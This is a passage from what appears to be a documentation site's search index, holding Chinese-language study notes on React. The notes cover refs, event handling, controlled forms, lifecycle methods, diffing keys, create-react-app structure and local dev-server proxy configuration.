\u590d\u6570\u5f62\u5f0f\uff08\u4e00\u4e2a\u7ec4\u4ef6\u5185\u90e8\u6709\u5f88\u591a refs\uff09</p> <pre><code>this.refs.input1\nthis.refs.input2\nthis.refs.input3\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#28-ref","title":"28 \u56de\u8c03\u5f62\u5f0f\u7684ref","text":"<p>\u4f7f\u7528\u5b57\u7b26\u4e32\u5f62\u5f0f\u521b\u5efa ref\uff0creact \u5b98\u65b9\u4e0d\u63a8\u8350\u8fd9\u79cd\u5199\u6cd5\uff08\u540e\u671f\u4f1a\u5e9f\u5f03\uff09\u6027\u80fd\u6bd4\u8f83\u5dee</p> <p>\u63a8\u8350\u4f7f\u7528 createRefs \u6216\u8005 \u56de\u8c03\u51fd\u6570\u521b\u5efa refs</p> <pre><code>&lt;input ref={(node) =&gt; this.input1 = node} /&gt;\n&lt;input ref={c =&gt; this.input2 = c}/&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#29-ref","title":"29 \u56de\u8c03ref\u4e2d\u8c03\u7528\u6b21\u6570\u7684\u95ee\u9898","text":"<p>\u5982\u679c\u56de\u8c03\u51fd\u6570\u76f4\u63a5\u5199\u5728 JSX \u4e2d\uff0c\u6bcf\u6b21 render \u90fd\u4f1a\u8c03\u7528\u4e24\u6b21\u3002\u6240\u4ee5\uff0c\u56de\u8c03\u51fd\u6570\u53ef\u4ee5\u653e\u5728\u7c7b\u7684\u65b9\u6cd5\u4e2d\u3002React \u5b98\u65b9\u8bf4\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684\u6027\u80fd\u5dee\u5f02\u4e0d\u5927\u3002</p> <pre><code>&lt;input ref={this.setRef}/&gt;\n\nsetRef = (node) =&gt; {\n  this.input2 = node;\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#30-createref","title":"30 createRef\u7684\u4f7f\u7528","text":"<pre><code>this.inputRef = React.createRef();\n\nlet a = this.inputRef.current.value;\n\n&lt;input ref={this.inputRef} /&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#31-ref","title":"31 \u603b\u7ed3ref","text":"<p>\u4e09\u79cd\u521b\u5efa ref \u7684\u65b9\u6cd5\u5bf9\u6bd4\uff0c\u5b98\u65b9\u63a8\u8350\u7b2c\u4e09\u79cd\uff0c\u5de5\u4f5c\u4e2d\u63a8\u8350\u540e\u4e24\u79cd\uff0c\u5b9e\u9645\u54ea\u79cd\u65b9\u4fbf\u7528\u54ea\u79cd\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#32-react","title":"32 react\u4e2d\u7684\u4e8b\u4ef6\u5904\u7406","text":"<p>react \u4e2d\u901a\u8fc7 onClick \u7ed1\u5b9a\u4e8b\u4ef6\uff08\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\uff09\uff1a\u4f7f\u7528\u5408\u6210\u4e8b\u4ef6\uff0c\u4e0d\u662f\u539f\u751f\u4e8b\u4ef6\uff0c\u4e3a\u4e86\u66f4\u597d\u7684\u517c\u5bb9\u6027\u3002\u4e8b\u4ef6\u901a\u8fc7\u65f6\u95f4\u59d4\u6258\u65b9\u5f0f\u5904\u7406\uff08\u59d4\u6258\u7ed9\u7ec4\u4ef6\u6700\u5916\u5c42\u7684\u5143\u7d20\uff09\u2014\u2014\u4e3a\u4e86\u66f4\u9ad8\u6548\uff08\u5982\u679c\u518d\u5e95\u5c42\u76d1\u542c\u4e8b\u4ef6\uff0c\u90a3\u4e48\u9700\u8981\u5f88\u591a\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\uff0c\u5728\u4e0a\u5c42\u53ea\u9700\u8981\u4e00\u4e2a\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\uff09\u3002\u53ef\u4ee5\u901a\u8fc7 event.target \u83b7\u53d6\u5230\u89e6\u53d1\u4e8b\u4ef6\u7684\u5bf9\u8c61</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#33","title":"33 \u975e\u53d7\u63a7\u7ec4\u4ef6","text":"<p>\u8868\u5355\u901a\u8fc7 ref \u83b7\u53d6\u8f93\u5165\u5185\u5bb9\uff0c\u5c31\u662f\u975e\u53d7\u63a7\u7ec4\u4ef6\uff08\u7528\u6237\u8f93\u5165\u8fc7\u7a0b\u4e2d\uff0creact\u4e0d\u4f1a\u83b7\u53d6\u5230\u8f93\u5165\u7684\u5185\u5bb9\uff09\u5207\u52ff\u8fc7\u5ea6\u4f7f\u7528refs</p> <p>\u4f7f\u7528\u72b6\u6001\u63d0\u5347\u53ef\u4ee5\u5904\u7406 ref \u8f83\u591a\u7684\u60c5\u51b5</p> <p>\u4e0b\u9762\u662f\u4f20\u7edf\u8868\u5355\uff0c\u70b9\u51fb\u6309\u94ae\u540e\uff0c\u4f1a\u81ea\u52a8\u83b7\u53d6 username \u548c password\uff0c\u7136\u540e\u63d0\u4ea4\u5230 action \u7f51\u5740\u4e2d\u3002</p> <pre><code>&lt;form action=\"www.baidu.com\"&gt;\n  username: &lt;input type=\"text\" name=\"username\"/&gt;\n  password: &lt;input type=\"password\" name=\"password\"/&gt;\n  &lt;button&gt;login&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#34","title":"34 \u53d7\u63a7\u7ec4\u4ef6","text":"<pre><code>&lt;input onChange={this.save(\"username\")}/&gt;\n&lt;input onChange={this.save(\"password\")}/&gt;\n\nsave = (type) =&gt; {\n  // \u8fd9\u91cc\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\uff0c\u5c31\u662f\u9ad8\u9636\u51fd\u6570\n  // \u9996\u6b21\u52a0\u8f7d\u65f6\uff0c\u8fd4\u56de\u8fd9\u4e2a\u51fd\u6570\u3002\u5f53 onChange \u89e6\u53d1\u65f6\uff0c\u6267\u884c\u5185\u90e8\u56de\u8c03\u51fd\u6570\n  return (event) =&gt; {\n    // console.log(event.target.value, type);\n    this.setState({\n      [type]: event.target.value\n    });\n  }\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#35-","title":"35 \u9ad8\u9636\u51fd\u6570-\u51fd\u6570\u67ef\u91cc\u5316","text":"<p>\u9ad8\u9636\u51fd\u6570\uff1a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6216\u8005\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u51fd\u6570\u7684\u51fd\u6570\uff0c\u5c31\u662f\u9ad8\u9636\u51fd\u6570\uff08Promsise, setTimeout, reduce\uff09</p> <p>\u51fd\u6570\u67ef\u91cc\u5316 carry-function\uff1a\u51fd\u6570\u8fd4\u56de\u503c\u662f\u51fd\u6570\uff0c\u53ef\u4ee5\u7ee7\u7eed\u94fe\u5f0f\u8c03\u7528\u3002\u591a\u6b21\u63a5\u6536\u53c2\u6570\uff0c\u6700\u540e\u7edf\u4e00\u8c03\u7528\u3002</p> <pre><code>function sum(a) {\n  return (b) =&gt; {\n    return (c) =&gt; {\n      return a + b + c;\n    }\n  }\n}\n\nconst result = sum(1)(2)(3);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#36","title":"36 \u4e0d\u7528\u67ef\u91cc\u5316\u7684\u5199\u6cd5","text":"<pre><code>&lt;input onChange={e =&gt; this.save('username', e.target.value)}/&gt;\n\nsave = (type, value) =&gt; {\n  this.setState({\n    [type]: value,\n  });\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#37","title":"37 \u751f\u547d\u5468\u671f","text":"<p>\u4ece\u8282\u70b9\u5378\u8f7d\u7ec4\u4ef6</p> <pre><code>ReactDOM.unmountComponentAtNode(document.getElementById('test'));\n</code></pre> <p>\u200b</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#43","title":"43 \u5bf9\u6bd4\u65b0\u65e7\u751f\u547d\u5468\u671f","text":"<p>\u65b0\u7248\u672c\u4e0d\u63a8\u8350\u4f7f\u7528\u7684\u4e09\u4e2a\u751f\u547d\u5468\u671f\u51fd\u6570\uff08ComponentWillMount, ComponentWillReceiveProps, ComponentWillUpdate\uff09\uff1b\u4ee5\u53ca\u65b0\u52a0\u5165\u7684\u4e24\u4e2a\u751f\u547d\u5468\u671f\u51fd\u6570(getDerivedStateFromProps, getSnapshotBeforeUpdate)</p> <p>\u4e3a\u4ec0\u4e48\u4e0d\u63a8\u8350\u4f7f\u7528\uff1f\u8fc7\u65f6\u7684\u4e09\u4e2a\u751f\u547d\u5468\u671f\u51fd\u6570\uff0c\u7ecf\u5e38\u9020\u6210\u8bef\u89e3\u6ee5\u7528\uff0c\u53ef\u80fd\u9020\u6210bug\u3002\u5728 17\u7248\u672c\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\uff0c\u754c\u9762\u4e0a\u63d0\u793a\u8b66\u544a\u3002\u5728 18 \u7248\u672c\u4e2d\u5f02\u6b65\u6e32\u67d3\uff0c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e09\u4e2a\u751f\u547d\u5468\u671f\u51fd\u6570\uff0c\u5fc5\u987b\u52a0\u4e0a UNSAVE \u524d\u7f00\uff08React.lazy, React.Suspend\uff09\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#44-getderivedstatefromprops","title":"44 getDerivedStateFromProps","text":"<p>\u8fd9\u4e2a\u751f\u547d\u5468\u671f\u51fd\u6570\u662f componentWillReceiveProps \u7684\u66ff\u4ee3\uff0c\u7528\u4e8e props \u53d8\u5316\u9020\u6210\u7ec4\u4ef6 state \u66f4\u65b0\u7684\u60c5\u51b5\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u5728\u7ec4\u4ef6render\u524d\uff0c\u6216\u8005\u7ec4\u4ef6\u66f4\u65b0\u540e\u90fd\u8c03\u7528\u3002</p> <pre><code>static getDerivedStateFromProps(nextProps, prevState) {\n  // \u5bf9\u6bd4 nextProps \u548c prevState \u7b49\uff0c\u8fd4\u56de\u65b0\u7684 state \u6216\u8005 null\n  // \u8fd9\u662f\u9759\u6001\u65b9\u6cd5\uff0c\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u5230\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u72b6\u6001\uff08this\uff09\n  if (nextProps.name !== prevState.name) {\n    prevState.name = nextProps.name;\n  }\n  return prevState;\n}\n</code></pre> <p>\u6d3e\u751f\u72b6\u6001\u4f1a\u9020\u6210\u4ee3\u7801\u5197\u4f59\uff0c\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u3002ComponentWillReceiveProps \u53ea\u5728\u7236\u7ec4\u4ef6\u91cd\u65b0\u6e32\u67d3\u65f6\u89e6\u53d1\uff0cgetDerivedStateFromProps \u5728\u6bcf\u6b21\u6e32\u67d3\u524d\u8c03\u7528\uff08\u5305\u62ec\u5185\u90e8setState\uff09\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#45-getsnapshotbeforeupdate","title":"45 getSnapshotBeforeUpdate","text":"<p>\u5728\u6e32\u67d3\u4e4b\u524d\u8c03\u7528\uff0c\u53ef\u4ee5\u83b7\u5f97 DOM \u4fe1\u606f\uff08\u4f8b\u5982\u5143\u7d20\u6eda\u52a8\u4f4d\u7f6e\uff09\uff0c\u8fd4\u56de\u503c\u4f20\u7ed9 componentDidUpdate \u51fd\u6570\uff0c\u7528\u4e8e\u5904\u7406\u6eda\u52a8\u4f4d\u7f6e\u548c\u52a8\u753b\u3002\u901a\u5e38\u4e0d\u4f7f\u7528\u3002</p> <pre><code>getSnapshotBeforeUpdate(prevProps, prevState) {\n  if (prevProps.list.length &lt; this.props.list.length) {\n    const list = this.listRef.current;\n    return list.scrollHeight - list.scrollTop;\n  }\n  return null;\n}\n\n// \u5f53\u6709\u65b0\u6d88\u606f\u52a0\u5165\u65f6\uff0c\u754c\u9762\u6eda\u52a8\u4f4d\u7f6e\u4e0d\u53d8\ncomponentDidUpdate(prevProps, prevState, snapshot) {\n  if (snapshot) {\n    const list = this.listRef.current;\n    list.scrollTop = list.scrollHeight - snapshot;\n  }\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#46-getsnapshotbeforeupdate","title":"46 getSnapshotBeforeUpdate \u4e3e\u4f8b","text":"<p>\u7b80\u5316\u7684\u6848\u4f8b</p> <pre><code>getSnapshotBeforeUpdate() {\n  return this.refs.list.scrollHeight;\n}\n\ncomponentDidUpdate(preProps, preState, height) {\n  this.refs.list.scrollTop += this.refs.list.scrollHeight - height;\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#47","title":"47 \u603b\u7ed3\u751f\u547d\u5468\u671f(\u65b0)","text":"<p>\u521d\u59cb\u5316\u9636\u6bb5\uff1agetDerivedStateFromProps render componentDidMount</p> <p>\u66f4\u65b0\u9636\u6bb5\uff1agetDerivedStateFromProps shouldComponentUpdate render getSnapshotBeforeUpdate componentDidUpdate</p> <p>\u5378\u8f7d\u9636\u6bb5\uff1acomponentWillUnmount</p> <p>\u6ce8\uff1agetDerivedStateFromProps \u5728\u9996\u6b21\u52a0\u8f7d\u548c\u518d\u6b21\u66f4\u65b0\u65f6\uff0c\u90fd\u4f1a\u89e6\u53d1\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#48-domdiffing","title":"48 DOM\u7684diffing\u7b97\u6cd5","text":"<p>\u5bf9\u5e94\u9762\u8bd5\u9898\uff1aReact \u4e2d key \u7684\u4f5c\u7528\u662f\u4ec0\u4e48\uff1f\u7528\u6765\u4f5c\u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u5728 \u6e32\u67d3\u8fc7\u7a0b\u4e2d diff \u7b97\u6cd5\u4e2d\uff0c\u5224\u65ad\u524d\u540e\u8282\u70b9\u662f\u5426\u53d1\u751f\u53d8\u5316\u3002\u5982\u679cKey\u53d8\u5316\u4e86\uff0c\u90a3\u4e48\u76f4\u63a5\u6e32\u67d3\u8fd9\u4e2a\u8282\u70b9\u3002\u5982\u679c key \u4e0d\u53d8\uff0c\u90a3\u4e48\u9012\u5f52\u6bd4\u8f83\u8fd9\u4e2a\u8282\u70b9\u5185\u90e8\u7684\u5b50\u8282\u70b9\u3002</p> <p>\u4f7f\u7528 index \u4f5c\u4e3a key \u53ef\u80fd\u5b58\u5728\u95ee\u9898\uff0c\u6240\u4ee5\u6700\u597d\u4f7f\u7528 id \u4f5c\u4e3a Key\u3002\u5982\u679c\u5728\u5927\u578b\u5217\u8868\u4e2d\uff0c\u5217\u8868\u9879\u8d8a\u591a\uff0c\u8fd9\u4e2a\u6027\u80fd\u95ee\u9898\u5c31\u8d8a\u5927\uff08\u91cd\u65b0\u52a0\u8f7d\u4e00\u4e2a\u8282\u70b9\uff0c\u8fd8\u662f\u91cd\u65b0\u52a0\u8f7d\u5168\u90e8\u7684\u8282\u70b9\uff09</p> <p>\u5982\u679c\u67d0\u4e9b\u5217\u8868\u662f\u9759\u6001\u7684\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 index \u4f5c\u4e3a key\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#react-cli","title":"\u7b2c\u4e09\u7ae0 react-cli","text":"<p>React-create-app</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#50-public","title":"50 \u811a\u624b\u67b6\u6587\u4ef6\u4ecb\u7ecd-public","text":"<p>favicon</p> <p>index.html</p> <p>logo.png</p> <p>Manifest.json \u5e94\u7528\u52a0\u58f3\u914d\u7f6e\u6587\u4ef6</p> <p>Robots.txt \u722c\u866b\u534f\u8bae\u6587\u4ef6</p> <pre><code>\u8fd9\u4e2a\u8868\u793a public \u6587\u4ef6\u5939\u7684\u8def\u5f84\n&lt;link ref=\"icon\" href=\"%PUBLIC_URL%/favicon.ico\"/&gt;\n\n// \u7406\u60f3\u89c6\u53e3\uff0c\u7528\u4e8e\u79fb\u52a8\u7aef\u7f51\u9875\u9002\u914d\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n\n// \u5b89\u5353\u79fb\u52a8\u7aef TAB \u80cc\u666f\u8272\uff08\u517c\u5bb9\u6027\u4e0d\u597d\uff09\n&lt;meta name=\"theme-color\" content=\"#000\"&gt;\n\n&lt;meta name=\"description\" content=\"this is test\" /&gt;\n\n// \u82f9\u679c\u624b\u673a\u684c\u9762\u5feb\u6377\u5e94\u7528\u56fe\u6807\n&lt;link rel=\"apple-touch-icon\" href=\"%PUBLIC%/logo192.png\" /&gt;\n\n// \u5e94\u7528\u52a0\u58f3\u89c4\u5219\n&lt;link rel=\"manifest\" href=\"%PUBLIC_URL%/manifest.json\"&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#51-src","title":"51 \u811a\u624b\u67b6\u6587\u4ef6\u4ecb\u7ecd-src","text":"<p>reportWebVitals.js \u9875\u9762\u6027\u80fd\u5206\u6790\u5de5\u5177</p> <p>React.StrictMode \u8fd9\u4e2a\u6807\u7b7e\u5e76\u4e0d\u4ee3\u8868\u4e25\u683c\u6a21\u5f0f\uff0c\u800c\u662f\u5904\u7406 React \u8bed\u6cd5\u4e2d\u7684\u63d0\u793a\uff08\u4f8b\u5982\u4f7f\u7528\u4e86\u8fc7\u65f6\u7684 ref=\"test\" \u7b49\uff09\u8fd9\u4e2a\u5305\u88f9\u5728\u9876\u5c42\u6807\u7b7e\u4e0b\u9762\u5373\u53ef\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#52","title":"52 \u7ec4\u4ef6\u5316\u7f16\u7801\u6d41\u7a0b","text":"<p>\u7ec4\u4ef6\u5316\u62c6\u5206\u6d41\u7a0b</p> <p>1\u3001\u62c6\u5206\u7ec4\u4ef6\uff1a\u6839\u636e\u8bbe\u8ba1\u7a3f\uff0c\u601d\u8003\u62c6\u5206\u6210\u591a\u5c11\u90e8\u5206</p> <p>2\u3001\u9759\u6001\u7ec4\u4ef6\u62c6\u5206\uff1a\u8bbe\u7f6e\u4e0d\u540c\u9759\u6001\u7ec4\u4ef6\uff0c\u540c\u65f6 mock \u6570\u636e</p> <p>3\u3001\u52a8\u6001\u6570\u636e\u66f4\u65b0\uff08\u72b6\u6001\u5c5e\u6027\uff0c\u754c\u9762\u4ea4\u4e92\u7b49\uff09</p> <p>\u4ece\u4e00\u4e2a\u65e7\u9879\u76ee\u91cd\u6784\u6210 react \u9879\u76ee\uff0c\u6216\u8005\u65b0\u9879\u76ee\uff0c\u6700\u597d\u5148\u4ece\u7ec6\u8282\u7ec4\u4ef6\uff0c\u516c\u5171\u7ec4\u4ef6\u505a\u8d77\u3002</p> <p>\u62c6\u5206\u7ec4\u4ef6\u7684\u539f\u5219\uff1a\u7ec4\u4ef6\u5728\u754c\u9762\u4e0a\u6709\u660e\u786e\u7684\u5206\u754c\uff0c\u7ec4\u4ef6\u6709\u660e\u786e\u7684\u540d\u79f0\uff08\u5bf9\u5e94\u7ec4\u4ef6\u7684\u529f\u80fd\u6216\u8005\u4f4d\u7f6e\uff09\u5982\u679c\u67d0\u4e2a\u7ec4\u4ef6\u540d\u79f0\u4e0d\u5408\u9002\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u529f\u80fd\u548c\u4f4d\u7f6e\u4e0d\u5408\u9002\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u62c6\u5206\u5904\u7406\u91cd\u6784\u3002</p> <p>\u5728 VScode \u4e2d\u52a0\u5165\u63d2\u4ef6\uff0c\u53ef\u4ee5\u7528\u5feb\u6377\u952e\u642d\u5efa\u57fa\u672c\u7684\u67b6\u6784</p> <p>ID \u7684\u5e93</p> <p>uuid \u5e93\u6bd4\u8f83\u5927\uff0c\u53ef\u4ee5\u4f7f\u7528 nanoid \u4ea7\u751f\u968f\u673a\u7684 ID\uff0c\u5728\u6027\u80fd\u8981\u6c42\u4e0d\u9ad8\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7528</p> <p>defaultChecked</p> <p>defaultChecked \u53ef\u4ee5\u521d\u59cb\u5316\u52fe\u9009\u72b6\u6001\uff0c\u4f46\u662f\u4e0d\u652f\u6301\u540e\u7eed state \u66f4\u6539\uff0c\u5b9e\u9645\u5de5\u7a0b\u4e2d\u907f\u514d\u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\u3002\u5b9e\u9645\u4e2d\u4f7f\u7528 checked = \u5904\u7406\u9009\u62e9\u6216\u8005\u4e0d\u9009\u62e9\uff0c\u8fd8\u6709\u4e00\u4e2a\u534a\u9009\u62e9\u7684\u56fe\u6807\uff08\u56de\u53bb\u67e5\u4e00\u4e0b\uff09</p> <p>checkbox \u5982\u679c\u83b7\u53d6 event.target.value \u53ef\u4ee5\u83b7\u53d6\u5230 on \u59cb\u7ec8\u662f\u8fd9\u4e2a\u503c\uff0c\u65e0\u610f\u4e49</p> <p>window.confirm \u539f\u751f\u7684\u5f39\u51fa\u6846\uff0c\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u7528\u6237\u7684\u9009\u62e9\uff0c\u7528\u4e8e\u7b80\u5355\u7684\u4ea4\u4e92\u3002\u8fd9\u4e2a\u4f1a\u963b\u6321JS\u7684\u6267\u884c\uff0c\u5728\u4e0d\u540c\u6d4f\u89c8\u5668\u4e2d\u53ef\u80fd\u4e0d\u7f8e\u89c2\uff0c\u5b9e\u9645\u9879\u76ee\u4e2d\u6ca1\u6709\u4f7f\u7528\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#react-ajax","title":"\u7b2c\u56db\u7ae0 react ajax","text":""},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#65-1","title":"65 \u811a\u624b\u67b6\u914d\u7f6e\u4ee3\u7406-\u65b9\u6cd51","text":"<p>react \u4e3b\u8981\u5904\u7406\u72b6\u6001\u7ba1\u7406\u548c\u754c\u9762\u6e32\u67d3\uff0c\u6ca1\u6709\u5305\u62ec\u7f51\u7edc\u8bf7\u6c42\u529f\u80fd\u3002\u901a\u5e38\u4f7f\u7528 axios \u505a\u7f51\u7edc\u8bf7\u6c42\uff08promise return \uff09\u3002</p> <pre><code>axios.get(url).then(res =&gt; {\n  console.log(res.data);\n}, err =&gt; {\n  console.log(err);\n});\n</code></pre> <p>\u5982\u679c\u672c\u5730\u670d\u52a1\u7aef\u5728 5000 \u7aef\u53e3\uff0c\u6d4f\u89c8\u5668\u754c\u9762\u662f 3000 \u7aef\u53e3\uff0c\u90a3\u4e48\u6839\u636e\u6d4f\u89c8\u5668\u540c\u6e90\u7b56\u7565\uff0c\u4f1a\u51fa\u73b0\u8de8\u57df\u7684\u95ee\u9898\u3002</p> <p>\u9700\u8981\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u628a5000\u8fd4\u56de\u7684\u54cd\u5e94\uff0c\u8f6c\u53d1\u52303000\u7aef\u53e3\u4e0a\u9762\u3002</p> <p>\u901a\u5e38\u5728 package.json \u4e2d\u8bbe\u7f6e\u4ee3\u7406\uff0c\u8fd9\u6837\u5c31\u80fd\u5904\u74065000\u7aef\u53e3\u8fd4\u56de\u7684\u6570\u636e\u4e86\u3002\u8fd9\u91cc\u8868\u793a\u5148\u8bf7\u6c423000\u7aef\u53e3\uff0c\u5982\u679c\u6ca1\u6709\u7684\u8bdd\u627e5000\u7aef\u53e3</p> <pre><code>\"proxy\": \"http://localhost:5000\"\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#66-2","title":"66 \u811a\u624b\u67b6\u914d\u7f6e\u4ee3\u7406-\u65b9\u6cd52","text":"<p>\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u670d\u52a1\u5668\u63d0\u4f9b\u591a\u79cd\u670d\u52a1\uff0c\u4f46\u662f\u524d\u7aef\u53ea\u6709\u4e00\u4e2a\u7aef\u53e3\uff0c\u6240\u4ee5\u4e5f\u9700\u8981\u5728\u670d\u52a1\u7aef\u5904\u7406\u8de8\u57df\u7684\u95ee\u9898\u3002</p> <p>\u8fd9\u4e2a\u5728 react \u811a\u624b\u67b6\u4e0b\u53ef\u4ee5\u8fd9\u6837\u914d\u7f6e\uff0c\u4e00\u4e2a\u9879\u76ee\u914d\u7f6e\u4e00\u6b21\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u591a\u6b21\u914d\u7f6e</p> <pre><code>// setProxy.js \u9700\u8981\u811a\u624b\u67b6\u73af\u5883\uff0c\u4e0d\u80fd\u6539\u540d\u5b57\n\n// \u8fd9\u4e2a\u5e93\u5df2\u7ecf\u5728 cra \u4e2d\u5305\u542b\uff0c\u4e0d\u9700\u8981\u5355\u72ec\u5b89\u88c5\nconst proxy = require('http-proxy-middleware'); \n\nmodule.exports = function(app) {\n  app.use(\n    // \u8fd9\u662f\u4e2d\u95f4\u4ef6\uff0c\u8868\u793a\u5224\u65adapi1\u7684\u8bf7\u6c42\uff0c\u53d1\u9001\u5230 5000 \u7aef\u53e3\uff0c\u7136\u540e\u6539\u53d8\u6e90\uff0c\u5e76\u4e14\u66ff\u6362\u5230 api1\n    proxy('/api1', {\n      target: 'http://localhost:5000',\n      changeOrigin: true, // \u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u5934\u4e2d Host \u5b57\u6bb5\u7684\u503c\uff08\u53ef\u9009\uff09\n      pathRewrite: {'^api1': ''},\n    }),\n    // \u53e6\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u5904\u7406\u53e6\u4e00\u4e2a\u8de8\u57df\u7684\u60c5\u51b5\n    proxy('/api2', {\n      target: 'http://localhost:5001',\n      changeOrigin: true,\n      pathRewrite: {'^api2': ''},\n    })\n  )\n}\n// \u8de8\u57df\u4e5f\u53ef\u4ee5\u5728\u670d\u52a1\u7aef\u4f7f\u7528 cors 